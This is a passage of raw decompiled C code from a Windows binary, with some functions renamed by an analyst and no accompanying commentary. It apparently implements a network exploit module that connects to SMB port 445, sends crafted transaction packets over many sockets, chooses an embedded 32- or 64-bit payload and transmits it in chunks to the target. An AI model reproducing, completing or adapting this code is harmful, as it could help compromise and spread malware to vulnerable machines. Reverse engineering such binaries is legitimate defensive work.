      --v47;
    }
    while ( v47 );
  }
  if ( byte_6820F8FC )
  {
    v48 = 8;
    HIBYTE(Src) = 112;
  }
  else
  {
    v48 = 4;
    HIBYTE(Src) = 56;
  }
  v37 = sub_681F4AFE(s, a3, a4, a5, a1, a7, v48, v32, v45, v31, SHIDWORD(v31), 0);
  GetAndFreeHeap(&v46);
  if ( v37 == -1 )
    return -1;
  if ( qword_6820FAF0 != v44 )
  {
    v38 = (dword_6820FB08 + dword_6820FB24 - 512);
    if ( v38 <= 0xFE80u )
      v37 = sub_681F4820(v48, s, a3, a4, a5, a1, a7, v44, SHIDWORD(v44), v38);
    else
      v37 = -1;
    qword_6820FAF0 = v44;
  }
  if ( v37 == -1 )
    return -1;
  v39 = (qword_6820FAE0 + HIBYTE(Src)) >> 32;
  v40 = qword_6820FAE0 + HIBYTE(Src);
  v46 = (qword_6820FAE0 + HIBYTE(Src)) >> 32;
  if ( qword_6820FAF0 != qword_6820FAE0 + HIBYTE(Src) )
  {
    if ( (dword_6820FB08 + dword_6820FB24 - 512) <= 0xFE80u )
    {
      v41 = sub_681F4820(v48, s, a3, a4, a5, a1, a7, v40, v39, (dword_6820FB08 + dword_6820FB24 - 512));
      v39 = v46;
      v37 = v41;
    }
    else
    {
      v37 = -1;
    }
    LODWORD(qword_6820FAF0) = v40;
    HIDWORD(qword_6820FAF0) = v39;
  }
  result = -1;
  if ( v37 != -1 )
  {
    dword_6820FB08 = 512;
    v42 = -1;
    if ( sub_681F4820(v48, s, a3, a4, a5, a1, 0, v44, SHIDWORD(v44), 0) != -1 )
    {
      a5 = CreateHeap(0xCu);
      if ( a5 )
      {
        a3 = 0;
        v43 = CreateHeap(0xDu);
        v46 = v43;
        if ( v43 )
        {
          v42 = sub_681F330E(s, 0, a4, 65279, a1, a6, 240, a5, v43, 13, &a3, &v46, &v45);
          GetAndFreeHeap(&a5);
          GetAndFreeHeap(&v46);
        }
      }
    }
    result = v42;
  }
  return result;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAE0: using guessed type __int64 qword_6820FAE0;
// 6820FAF0: using guessed type __int64 qword_6820FAF0;
// 6820FAF8: using guessed type __int64 qword_6820FAF8;
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB10: using guessed type int dword_6820FB10;
// 6820FB14: using guessed type int dword_6820FB14;
// 6820FB1C: using guessed type int dword_6820FB1C;
// 6820FB20: using guessed type __int16 word_6820FB20;
// 6820FB24: using guessed type int dword_6820FB24;
// 6820FB28: using guessed type __int16 word_6820FB28;
// 6820FB2C: using guessed type __int16 word_6820FB2C;
// 6820FB30: using guessed type __int16 word_6820FB30;
// 6820FB34: using guessed type __int16 word_6820FB34;
// 6820FB38: using guessed type int dword_6820FB38;
// 6820FB3C: using guessed type int dword_6820FB3C;
// 6820FB40: using guessed type int dword_6820FB40;
// 6820FB44: using guessed type __int16 word_6820FB44;

//----- (681F5A46) --------------------------------------------------------
int __stdcall SocketUseSockets(int a1, SOCKET s, int a3, int a4, int a5, int a6, int a7)
{
  SocketUseSocket1(s, a3, a4, a5, a6, a7);
  SocketUseSocket2(s, a3, a4, a5, a6, a7);
  return a1;
}

//----- (681F5A7E) --------------------------------------------------------
int __userpurge sub_681F5A7E@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, char *cp, u_short hostshort, int a6, int a7, int a8, int a9, int a10, int a11, int a12)
{
  unsigned __int16 v12; // ax
  void *v13; // ebx
  _WORD *v14; // ST30_4
  void *v15; // ST28_4
  SOCKET *v16; // ebx
  SOCKET v17; // eax
  LPVOID v18; // eax
  unsigned __int16 v19; // ax
  int v20; // esi
  SOCKET v21; // ST1C_4
  int v22; // edi
  int v23; // ST30_4
  int v24; // edi
  SOCKET v25; // edi
  char *v26; // ebx
  int v27; // ebx
  void *v28; // ebx
  void *v29; // edi
  SOCKET *v30; // esi
  signed int v31; // eax
  signed int v32; // ebx
  int result; // eax
  int v34; // ecx
  char v35; // al
  void *v36; // ecx
  char *v37; // esi
  size_t v38; // esi
  SIZE_T v39; // eax
  int v40; // eax
  void *v41; // eax
  size_t *v42; // eax
  SIZE_T v43; // esi
  BOOL *v44; // esi
  SOCKET v45; // [esp+4h] [ebp-60h]
  int v46; // [esp+8h] [ebp-5Ch]
  int v47; // [esp+Ch] [ebp-58h]
  void *v48; // [esp+10h] [ebp-54h]
  int v49; // [esp+14h] [ebp-50h]
  int v50; // [esp+18h] [ebp-4Ch]
  char v51; // [esp+2Fh] [ebp-35h]
  int v52; // [esp+30h] [ebp-34h]
  int v53; // [esp+34h] [ebp-30h]
  int v54; // [esp+38h] [ebp-2Ch]
  void *v55; // [esp+3Ch] [ebp-28h]
  int v56; // [esp+40h] [ebp-24h]
  int v57; // [esp+44h] [ebp-20h]
  int v58; // [esp+48h] [ebp-1Ch]
  SIZE_T dwBytes; // [esp+4Ch] [ebp-18h]
  size_t v60; // [esp+50h] [ebp-14h]
  void *Src; // [esp+54h] [ebp-10h]
  size_t Size; // [esp+58h] [ebp-Ch]
  int v63; // [esp+5Ch] [ebp-8h]
  int v64; // [esp+60h] [ebp-4h]

  while ( 1 )
  {
    v51 = 0;
    if ( SocketCreateAndConnect(&v51, &a3, cp, hostshort) )
      return -1;
    v12 = CheckIfTimePassed();
    v13 = v12;
    v56 = v12;
    v55 = 65279;
    v54 = 0;
    v52 = 0;
    v14 = CheckIfTimePassed();
    v15 = v13;
    v16 = a3;
    v53 = v14;
    v17 = *a3;
    dwBytes = 0;
    v57 = 0;
    v60 = 0;
    Src = 0;
    if ( SockSendRecvDataFreeHeap(v17, 49159, v15, 65279, v14)
      || SockProcessSendRecv_2(*v16, 49159, v56, 65279, &v52, v53, 0xD, 0, 0, &v57, &v60) )
    {
      return -1;
    }
    if ( !v57 || (LOBYTE(v58) = Unk_SockChecks(v57, v60), GetAndFreeHeap(&v57), v58 == -1) )
    {
      SocketUseSocket2(*v16, v56, 0, 65279, v52, v53);
LABEL_100:
      SockCloseConnection(v16);
      return -1;
    }
    if ( sub_681F3061(*v16, v56, &v54, 0xFEFF, v52, v53) )
    {
      SocketUseSocket2(*v16, v56, v54, 65279, v52, v53);
      goto LABEL_100;
    }
    v18 = CreateHeap(0xCu);
    v64 = v18;
    if ( !v18 )
      return -1;
    Size = sub_681F330E(*v16, v56, v54, 65279, v52, v53 + 1, 240, v18, 0, 0, &Src, &v57, &v60);
    GetAndFreeHeap(&v64);
    if ( Size == -1 || !v57 )
      goto LABEL_127;
    if ( *(v57 + 26) == 17 )
      break;
    GetAndFreeHeap(&v57);
    if ( sub_681F35FA(*v16, 0xFFFF, 10241, v56, v54, 65279, v52, v53, 2, 255, 0) != -1073741307 )
      goto LABEL_127;
    if ( !a6 )
      goto LABEL_124;
    if ( byte_6820F8FD >= 3u )
      goto LABEL_127;
    ++byte_6820F8FD;
    if ( v58 != 2 && v58 != 3 && v58 != 4 )
      goto LABEL_25;
    LOBYTE(v63) = 0;
    if ( SocketProcessSocket_1(&v63, *v16, v56, v54, 65279, v52, v53, &dwBytes) )
      goto LABEL_127;
    v19 = rand();
    v20 = v54;
    v21 = *v16;
    v55 = v19;
    if ( SocketProcessSocket_2(&v53, v21, v56, v54, v19, v52, dwBytes) )
    {
LABEL_133:
      v50 = v53;
      v49 = v52;
LABEL_134:
      v48 = v55;
      v47 = v20;
      goto LABEL_129;
    }
    v22 = v52;
    if ( sub_681F42DF(*v16, v56, v20, v55, v52, &v53, dwBytes)
      || sub_681F489C(&v53, &v55, *v16, v56, v20, v22, dwBytes)
      || sub_681F4BA1(*v16, v56, v20, v55, v22, dwBytes) )
    {
      v50 = v53;
      v49 = v22;
      goto LABEL_134;
    }
    v23 = v22;
    v24 = dwBytes;
    if ( sub_681F51F3(dwBytes, *v16, v56, v20, v55, v23) )
      goto LABEL_133;
    if ( sub_681F5333(v52, *v16, v56, v20, v55, v53, v24, v63) )
      goto LABEL_136;
    v16 = a3;
LABEL_25:
    if ( v58 == 5 || v58 == 6 || v58 == 7 )
    {
      v25 = *v16;
      Size = 0;
      dwBytes = sub_681F2547(&Size, v56, v54, v55, v52, v53);
      if ( dwBytes )
      {
        Src = CreateHeap(0x1000u);
        if ( Src )
        {
          v64 = 0;
          if ( SockSendBuffer(v25, dwBytes, Size) || (v26 = Src, SockreceivData(&v64, v25, 1, Src)) )
          {
            GetAndFreeHeap(&Src);
            GetAndFreeHeap(&dwBytes);
          }
          else
          {
            v27 = *(v26 + 9);
            GetAndFreeHeap(&Src);
            GetAndFreeHeap(&dwBytes);
            if ( !v27 && !sub_681F3B5D(v25, v56, v54, v55, v52, v53) )
            {
              Sleep(0x456u);
              if ( SocketCreateAndConnect(&v51, &a3, cp, hostshort) )
              {
LABEL_136:
                v50 = v53;
                v49 = v52;
                v48 = v55;
                v47 = v54;
                v46 = v56;
                v45 = *a3;
                goto LABEL_130;
              }
              v28 = v53;
              v29 = v56;
              v30 = a3;
              if ( !SockSendRecvDataFreeHeap(*(a3 + 4), 49235, v56, v55, v53) )
              {
                Size = 0;
                if ( !SockProcessSendRecv_2(v30[1], 49159, v29, v55, &Size, v28, 0xC, 301, 0xFFF0, &v57, &v60) )
                {
                  if ( SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[2])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[3])
                    || sub_681F3CA0(0, v30[4])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[5])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[6])
                    || sub_681F3CA0(0, v30[7])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[8])
                    || sub_681F3CA0(0, v30[9])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[10])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[11])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[12])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[13])
                    || SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                    || sub_681F3CA0(0, v30[14]) )
                  {
                    goto LABEL_139;
                  }
                  Sleep(0x456u);
                  v28 = v53;
                  if ( !SockSendRecvDataFreeHeap(v30[15], 49235, v29, v55, v53)
                    && !SockProcessSendRecv_2(v30[15], 16391, v29, v55, &Size, v28, 0xC, 300, 0x87F8, &v57, &v60) )
                  {
                    if ( v30[1] )
                    {
                      closesocket(v30[1]);
                      v30[1] = 0;
                    }
                    if ( !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                      && !sub_681F3CA0(0, v30[16])
                      && !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                      && !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                      && !sub_681F3CA0(0, v30[17])
                      && !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                      && !sub_681F3CA0(0, v30[18])
                      && !SocketCreateAndConnect(&v51, &a3, cp, hostshort)
                      && !sub_681F3CA0(0, v30[19])
                      && !sub_681F3CA0(0, v30[20]) )
                    {
                      if ( v30[15] )
                      {
                        closesocket(v30[15]);
                        v30[15] = 0;
                      }
                      v28 = v53;
                      v31 = sub_681F369D(*v30, v29, v54, v55, v52, v53);
                      v50 = v28;
                      v49 = v52;
                      v48 = v55;
                      v47 = v54;
                      v46 = v29;
                      v45 = *v30;
                      if ( v31 )
                        goto LABEL_130;
                      if ( !sub_681F3C0A(v45, v29, v54, v55, v52, v28) )
                      {
                        v60 = 2;
                        while ( v60 == 15 || !sub_681F3CA0(1, v30[v60]) )
                        {
                          if ( ++v60 >= 20 )
                          {
                            v32 = 2;
                            while ( v32 == 15 || !sub_681F3CA0(2, v30[v32]) )
                            {
                              if ( ++v32 >= 20 )
                              {
                                v16 = a3;
                                goto LABEL_92;
                              }
                              v30 = a3;
                              v29 = v56;
                            }
                            goto LABEL_139;
                          }
                        }
                      }
                      goto LABEL_137;
                    }
LABEL_139:
                    v50 = v53;
                    goto LABEL_138;
                  }
                }
              }
LABEL_137:
              v50 = v28;
LABEL_138:
              v49 = v52;
              v48 = v55;
              v47 = v54;
              v46 = v29;
              v45 = *v30;
              goto LABEL_130;
            }
          }
          v16 = a3;
        }
        else
        {
          GetAndFreeHeap(&dwBytes);
        }
      }
      v50 = v53;
      v49 = v52;
      v48 = v55;
      goto LABEL_128;
    }
LABEL_92:
    SocketUseSockets(0, *v16, v56, v54, v55, v52, v53);
    SockCloseConnection(v16);
    Sleep(0x456u);
  }
  v34 = *(v57 + 22);
  byte_6820F8FC = -1;
  if ( !v34 )
    byte_6820F8FC = 0;
  if ( v34 == 1 )
    byte_6820F8FC = 1;
  if ( !a6 )
  {
    GetAndFreeHeap(&v57);
    return SocketUseSockets(13650718, *v16, v56, v54, 65279, v52, v53);
  }
  v63 = 2 * *(v57 + 18) ^ (((*(v57 + 18) & 0xFF00 | (*(v57 + 18) << 16)) << 8) | (((*(v57 + 18) >> 16) | *(v57 + 18) & 0xFF0000u) >> 8));
  GetAndFreeHeap(&v57);
  if ( !v63 )
    goto LABEL_127;
  v60 = 0;
  v55 = 0;
  v35 = 0;
  if ( byte_6820F8FC == 1 )
  {
    v35 = 1;
    v36 = &unk_6820F900;
    v37 = &SomeExe2;
  }
  else
  {
    v36 = &unk_68207090;
    v37 = SomeExe1;
  }
  (a6)(a7, a8, v37, v35 == 0 ? 4208 : 4720, v36, v35 == 0 ? 1998 : 462, &v55, &v60, a9, a10, a11, a12);
  Size = 0;
  Src = 0;
  if ( Unk_FindResourceAndIterate(&Src, a1, a2, &Size, v60, v58) )
    goto LABEL_127;
  v38 = Size;
  v39 = Size + v60 + 8;
  dwBytes = v39;
  v40 = v39 & 3;
  if ( v40 )
    dwBytes += 4 - v40;
  v41 = CreateHeap(dwBytes);
  v58 = v41;
  if ( !v41 || !v55 )
  {
    v44 = &Src;
    goto LABEL_126;
  }
  memcpy(v41, Src, v38);
  v42 = (v38 + v58);
  *v42 = v60;
  v42[1] = 1;
  memcpy(v42 + 2, v55, v60);
  GetAndFreeHeap(&Src);
  v57 = 0;
  Src = 0;
  v43 = dwBytes >> 12;
  v64 = dwBytes & 0xFFF;
  if ( dwBytes >> 12 && (Size = 0, v43) )
  {
    while ( !CreateAndGetHeap(*v16, v56, v54, 65279, v52, v53 + 1, v63, 4096, v58, dwBytes, v57, &Src) )
    {
      v57 += 4096;
      if ( ++Size >= v43 )
        goto LABEL_121;
    }
LABEL_125:
    v44 = &v58;
LABEL_126:
    GetAndFreeHeap(v44);
LABEL_127:
    v50 = v53;
    v49 = v52;
    v48 = 65279;
LABEL_128:
    v47 = v54;
LABEL_129:
    v46 = v56;
    v45 = *v16;
LABEL_130:
    result = SocketUseSockets(-1, v45, v46, v47, v48, v49, v50);
  }
  else
  {
LABEL_121:
    Sleep(0x456u);
    if ( v64 && CreateAndGetHeap(*v16, v56, v54, 65279, v52, v53 + 1, v63, v64, v58, dwBytes, v57, &Src) )
      goto LABEL_125;
    GetAndFreeHeap(&v58);
LABEL_124:
    result = SocketUseSockets(0, *v16, v56, v54, 65279, v52, v53);
  }
  return result;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820F8FD: using guessed type char byte_6820F8FD;

//----- (681F668A) --------------------------------------------------------
int __userpurge sub_681F668A@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *cp, int a4, int a5, int a6, int a7, int a8, int a9)
{
  int v9; // edi
  int result; // eax
  int v11; // esi
  char Dst; // [esp+8h] [ebp-54h]

  memset(&Dst, 0, 0x54u);
  LOWORD(dword_6820FB48) = GetTickCount();
  byte_6820F8FD = 0;
  v9 = sub_681F5A7E(a1, a2, &Dst, cp, 0x1BDu, 0, a4, a5, a6, a7, a8, a9);
  if ( v9 )
  {
    SockCloseConnection(&Dst);
    result = v9;
  }
  else
  {
    byte_6820F8FD = 0;
    v11 = sub_681F5A7E(a1, a2, &Dst, cp, 0x1BDu, GetHeapAndMoveData, a4, a5, a6, a7, a8, a9);
    SockCloseConnection(&Dst);
    result = v11;
  }
  return result;
}
// 6820F8FD: using guessed type char byte_6820F8FD;
// 6820FB48: using guessed type int dword_6820FB48;

//----- (681F6727) --------------------------------------------------------
int __userpurge SocketCreateAndConnect@<eax>(unsigned __int8 *a1@<ebx>, int a2, char *cp, u_short hostshort)
{
  SOCKET v4; // esi
  unsigned __int8 v6; // al
  int v7; // edx
  struct sockaddr name; // [esp+Ch] [ebp-18h]
  u_long argp; // [esp+1Ch] [ebp-8h]

  v4 = socket(2, 1, 6);
  argp = 1;
  ioctlsocket(v4, -2147195266, &argp);
  if ( v4 == -1 )
    return -1;
  v6 = *a1;
  if ( *a1 >= 0x20u )
    return -1;
  v7 = *a2;
  *a1 = v6 + 1;
  *(v7 + 4 * v6) = v4;
  *&name.sa_data[6] = 0;
  *&name.sa_data[10] = 0;
  name.sa_family = 2;
  *name.sa_data = htons(hostshort);
  *&name.sa_data[2] = inet_addr(cp);
  connect(v4, &name, 16);
  return 0;
}

//----- (681F67AF) --------------------------------------------------------
int __userpurge SockGetData@<eax>(char **a1@<ebx>, __int16 *a2@<esi>, SOCKET s, char a4, int a5)
{
  int v5; // eax
  __int16 v6; // ax
  unsigned int v7; // edi
  unsigned __int16 v8; // ax
  unsigned int v9; // ecx
  __int16 v11; // ax
  fd_set readfds; // [esp+4h] [ebp-10Ch]
  struct timeval timeout; // [esp+108h] [ebp-8h]

  memset(readfds.fd_array, 0, 0x100u);
  timeout.tv_sec = 0;
  readfds.fd_array[0] = s;
  timeout.tv_usec = 13000000;
  readfds.fd_count = 1;
  v5 = select(0, &readfds, 0, 0, &timeout);
  if ( v5 != -1 )
  {
    if ( v5 )
    {
      v6 = recv(s, *a1, *a5, 0);
      *a2 = v6;
      if ( v6 > 0 )
      {
        v7 = a4 * (htons(*(*a1 + 1)) + 4);
        v8 = *a2;
        v9 = *a2;
        if ( v9 == v7 || v9 >= v7 )
          return 0;
        while ( 1 )
        {
          v11 = recv(s, &(*a1)[v8], *a5 - v8, 0);
          if ( v11 <= 0 )
            break;
          *a2 += v11;
          v8 = *a2;
          if ( *a2 >= v7 )
            return 0;
        }
      }
    }
  }
  return -1;
}

//----- (681F688F) --------------------------------------------------------
int __userpurge SockSendBuffer@<eax>(SOCKET a1@<ebx>, char *buf, int len)
{
  int v3; // eax
  int result; // eax
  fd_set writefds; // [esp+4h] [ebp-10Ch]
  struct timeval timeout; // [esp+108h] [ebp-8h]

  if ( buf
    && (memset(writefds.fd_array, 0, 0x100u),
        timeout.tv_sec = 0,
        timeout.tv_usec = 13000000,
        writefds.fd_array[0] = a1,
        writefds.fd_count = 1,
        v3 = select(0, 0, &writefds, 0, &timeout),
        v3 != -1)
    && v3 )
  {
    result = (send(a1, buf, len, 0) > 0) - 1;
  }
  else
  {
    result = -1;
  }
  return result;
}

//----- (681F6916) --------------------------------------------------------
int __stdcall ConvertHeapMToWBytes(LPCSTR lpMultiByteStr)
{
  int v1; // eax
  SIZE_T v2; // ST14_4
  HANDLE v3; // eax
  WCHAR *v4; // eax
  bool v5; // zf
  int result; // eax
  int v7; // [esp+10h] [ebp-8h]
  int cchWideChar; // [esp+14h] [ebp-4h]

  v1 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);
  cchWideChar = v1;
  if ( !v1
    || (v2 = 2 * v1, v3 = GetProcessHeap(), v4 = HeapAlloc(v3, 0, v2), (v7 = v4) == 0)
    || (v5 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, v4, cchWideChar) == 0, result = v7, v5) )
  {
    result = 0;
  }
  return result;
}

//----- (681F6973) --------------------------------------------------------
int ReturnTimeIfTimePassed()
{
  DWORD v0; // eax

  v0 = (GetTickCount() - TickCountTime) / 0x3C / 0x3E8;
  return v0 < dword_6820F760 ? dword_6820F760 - v0 : 0;
}
// 6820F118: using guessed type int TickCountTime;
// 6820F760: using guessed type int dword_6820F760;

//----- (681F69A2) --------------------------------------------------------
signed int __usercall CheckUsrArgs@<eax>(int a1@<eax>)
{
  const WCHAR *v1; // eax
  int v2; // edi
  WCHAR *v3; // ecx
  LPWSTR *v4; // ebx
  LPWSTR v5; // ecx
  int v6; // esi
  WCHAR v7; // dx
  signed int v9; // [esp+8h] [ebp-8h]
  int pNumArgs; // [esp+Ch] [ebp-4h]

  v1 = (a1 + 4);
  v2 = 0;
  v9 = 1;
  v3 = v1;
  if ( *v1 )
  {
    do
    {
      ++v3;
      if ( *v3 == 59 )
        *v3 = 32;
    }
    while ( *v3 );
  }
  pNumArgs = 0;
  v4 = CommandLineToArgvW(v1, &pNumArgs);
  if ( v4 )
  {
    if ( pNumArgs > 0 )
    {
      do
      {
        v5 = v4[v2];
        v6 = (v5 + 1);
        do
        {
          v7 = *v5;
          ++v5;
        }
        while ( v7 );
        if ( ((v5 - v6) >> 1) < 0x10 )
          v9 &= sub_681F6FC7(v4[v2], 0, lpParameter);
        ++v2;
      }
      while ( v2 < pNumArgs );
    }
    LocalFree(v4);
  }
  return v9;
}

//----- (681F6A2B) --------------------------------------------------------
int __stdcall CheckCmdLineArgs(LPCWSTR lpCmdLine)
{
  LPWSTR *v1; // eax
  LPWSTR *v2; // esi
  int v3; // eax
  signed int v4; // ebx
  LPWSTR v5; // edi
  _WORD *v6; // eax
  int pNumArgs; // [esp+4h] [ebp-4h]

  if ( lpCmdLine )
  {
    if ( wcslen(lpCmdLine) )
    {
      pNumArgs = 0;
      v1 = CommandLineToArgvW(lpCmdLine, &pNumArgs);
      v2 = v1;
      if ( v1 )
      {
        if ( pNumArgs > 0 )
        {
          v3 = StrToIntW(*v1);
          v4 = 1;
          if ( v3 > 0 )
            dword_6820F760 = v3;
          if ( pNumArgs > 1 )
          {
            while ( 1 )
            {
              v5 = v2[v4];
              if ( v5 == StrStrW(v2[v4], L"-h") )
                break;
              v6 = StrChrW(v5, 58);
              if ( v6 )
              {
                *v6 = 0;
                CleanUpHeaps(v5, v6 + 1, 1);
              }
              if ( ++v4 >= pNumArgs )
                goto LABEL_14;
            }
            CheckUsrArgs(v2[v4]);
          }
        }
LABEL_14:
        LocalFree(v2);
      }
    }
  }
  if ( !dword_6820F760 )
    dword_6820F760 = 60;
  return 0;
}
// 681FD220: using guessed type int __stdcall StrToIntW(_DWORD);
// 681FD234: using guessed type int __stdcall StrChrW(_DWORD, _DWORD);
// 681FD23C: using guessed type int __stdcall StrStrW(_DWORD, _DWORD);
// 68203FF0: using guessed type wchar_t asc_68203FF0[3];
// 6820F760: using guessed type int dword_6820F760;

//----- (681F6AF0) --------------------------------------------------------
int GeneratePath()
{
  int v0; // edi
  _DWORD *v1; // ebx
  unsigned int v2; // kr00_4
  HANDLE v3; // eax
  int result; // eax
  WCHAR v5; // [esp+Ch] [ebp-804h]
  __int16 v6; // [esp+Eh] [ebp-802h]
  _DWORD **v7; // [esp+80Ch] [ebp-4h]

  word_6820B110 = 0;
  v0 = 0;
  v7 = 0;
  v1 = GetHeapAndFreeIt(lpCriticalSection, 1, &v7);
  if ( v1 )
  {
    do
    {
      wsprintfW(&v5, L" \"%ws:%ws\"", **v7, (*v7)[1]);
      v2 = wcslen(&v5);
      if ( v2 + v0 >= 0x1FF5 )
        break;
      StrCatW(&v6, &word_6820B110, &v5);
      v7 = 0;
      v0 += v2;
    }
    while ( EnterAndLeaveCritSection_3(v1, lpCriticalSection, &v7) );
    v3 = GetProcessHeap();
    HeapFree(v3, 0, v1);
  }
  result = 0;
  dword_68206010 = 0;
  word_6820F0F8 = 0;
  return result;
}
// 681FD238: using guessed type int __thiscall StrCatW(_DWORD, _DWORD, _DWORD);
// 68206010: using guessed type int dword_68206010;
// 6820B110: using guessed type __int16 word_6820B110;
// 6820F0F8: using guessed type __int16 word_6820F0F8;

//----- (681F6BB0) --------------------------------------------------------
int __stdcall sub_681F6BB0(_WORD *a1)
{
  unsigned int v1; // eax
  unsigned int v2; // kr00_4
  int v3; // esi
  unsigned int v4; // kr04_4
  int v5; // ecx
  WCHAR v7; // [esp+0h] [ebp-800h]

  v1 = ReturnTimeIfTimePassed();
  if ( v1 < 0xA )
    v1 = 10;
  wsprintfW(&v7, L"%d", v1);
  v2 = wcslen(&v7);
  v3 = v2;
  EnterCriticalSection(&CriticalSection);
  if ( dword_68206010 )
    GeneratePath();
  v4 = wcslen(&word_6820B110);
  if ( v4 + v2 >= 0x1FFE )
  {
    SetLastError(0x7Au);
  }
  else
  {
    *a1 = 0;
    StrCatW(&v7, a1, &v7);
    StrCatW(v5, a1, &word_6820B110);
    v3 = v4 + v2;
  }
  LeaveCriticalSection(&CriticalSection);
  return v3;
}
// 681FD238: using guessed type int __thiscall StrCatW(_DWORD, _DWORD, _DWORD);
// 68206010: using guessed type int dword_68206010;
// 6820B110: using guessed type __int16 word_6820B110;

//----- (681F6C74) --------------------------------------------------------
signed int __stdcall CompareStringsW_2(int a1, int a2, int a3)
{
  signed int v3; // ebx

  v3 = 0;
  if ( !StrCmpIW(*a1, *a2) && !StrCmpW(*(a1 + 4), *(a2 + 4)) )
    v3 = 1;
  return v3;
}
// 681FD22C: using guessed type int __stdcall StrCmpW(_DWORD, _DWORD);
// 681FD230: using guessed type int __stdcall StrCmpIW(_DWORD, _DWORD);

//----- (681F6CAA) --------------------------------------------------------
void __stdcall CleanUpHeaps_3(int a1)
{
  void *v1; // ST08_4
  HANDLE v2; // eax
  void *v3; // ebx
  HANDLE v4; // eax

  if ( a1 )
  {
    if ( *a1 )
    {
      v1 = *a1;
      v2 = GetProcessHeap();
      HeapFree(v2, 0, v1);
    }
    v3 = *(a1 + 4);
    if ( v3 )
    {
      v4 = GetProcessHeap();
      HeapFree(v4, 0, v3);
    }
  }
}

//----- (681F6CE7) --------------------------------------------------------
int __stdcall CleanUpHeaps_2(void *Src, void *a2)
{
  unsigned int v2; // kr00_4
  HANDLE v3; // eax
  unsigned int v4; // kr08_4
  HANDLE v5; // eax
  int v6; // eax
  void *v7; // ST08_4
  HANDLE v8; // eax
  void *v9; // ST08_4
  HANDLE v10; // eax
  void *Dst; // [esp+0h] [ebp-10h]
  void *lpMem; // [esp+4h] [ebp-Ch]
  struct _RTL_CRITICAL_SECTION *v14; // [esp+8h] [ebp-8h]
  int v15; // [esp+Ch] [ebp-4h]

  v15 = 0;
  v14 = lpCriticalSection;
  v2 = wcslen(Src);
  v3 = GetProcessHeap();
  Dst = HeapAlloc(v3, 8u, 2 * v2 + 2);
  if ( Dst )
  {
    memcpy(Dst, Src, 2 * wcslen(Src) + 2);
    v4 = wcslen(a2);
    v5 = GetProcessHeap();
    lpMem = HeapAlloc(v5, 8u, 2 * v4 + 2);
    if ( lpMem )
    {
      memcpy(lpMem, a2, 2 * wcslen(a2) + 2);
      v6 = EnterAndLeaveCritSection(v14, 0, &Dst);
      v7 = lpMem;
      v15 = v6;
      v8 = GetProcessHeap();
      HeapFree(v8, 0, v7);
    }
    v9 = Dst;
    v10 = GetProcessHeap();
    HeapFree(v10, 0, v9);
  }
  return v15;
}

//----- (681F6DE0) --------------------------------------------------------
int __stdcall CleanUpHeaps(void *Src, void *a2, int a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // ebx
  unsigned int v4; // kr00_4
  HANDLE v5; // eax
  unsigned int v6; // kr08_4
  HANDLE v7; // eax
  void *v8; // ST08_4
  HANDLE v9; // eax
  void *v10; // ST08_4
  HANDLE v11; // eax
  void *Dst; // [esp+Ch] [ebp-Ch]
  void *lpMem; // [esp+10h] [ebp-8h]
  int v15; // [esp+14h] [ebp-4h]

  v15 = 0;
  v3 = lpCriticalSection;
  v4 = wcslen(Src);
  v5 = GetProcessHeap();
  Dst = HeapAlloc(v5, 8u, 2 * v4 + 2);
  if ( Dst )
  {
    memcpy(Dst, Src, 2 * wcslen(Src) + 2);
    v6 = wcslen(a2);
    v7 = GetProcessHeap();
    lpMem = HeapAlloc(v7, 8u, 2 * v6 + 2);
    if ( !lpMem )
    {
LABEL_5:
      v10 = Dst;
      v11 = GetProcessHeap();
      HeapFree(v11, 0, v10);
      return v15;
    }
    memcpy(lpMem, a2, 2 * wcslen(a2) + 2);
    v15 = EnumerateProcessHeap(v3, &Dst, a3);
    if ( !v15 )
    {
      v8 = lpMem;
      v9 = GetProcessHeap();
      HeapFree(v9, 0, v8);
      goto LABEL_5;
    }
  }
  return v15;
}

//----- (681F6EDA) --------------------------------------------------------
BOOL __stdcall CompareStringsW(int a1, int a2, int a3)
{
  BOOL result; // eax

  if ( a1 && a2 )
    result = StrCmpIW(a1, a2) == 0;
  else
    result = 0;
  return result;
}
// 681FD230: using guessed type int __stdcall StrCmpIW(_DWORD, _DWORD);

//----- (681F6F02) --------------------------------------------------------
BOOL __userpurge LaunchCrit3@<eax>(int a1@<ebx>, struct _RTL_CRITICAL_SECTION *a2@<esi>, __int16 *a3)
{
  __int16 *v3; // ecx
  __int16 *v4; // edx
  __int16 v5; // ax
  __int16 **v7; // [esp+0h] [ebp-4h]

  v7 = 0;
  if ( !EnterAndLeaveCritSection_3(a1, a2, &v7) )
    return 0;
  v3 = *v7;
  v4 = a3;
  do
  {
    v5 = *v3;
    *v4 = *v3;
    ++v3;
    ++v4;
  }
  while ( v5 );
  return a3 != 0;
}

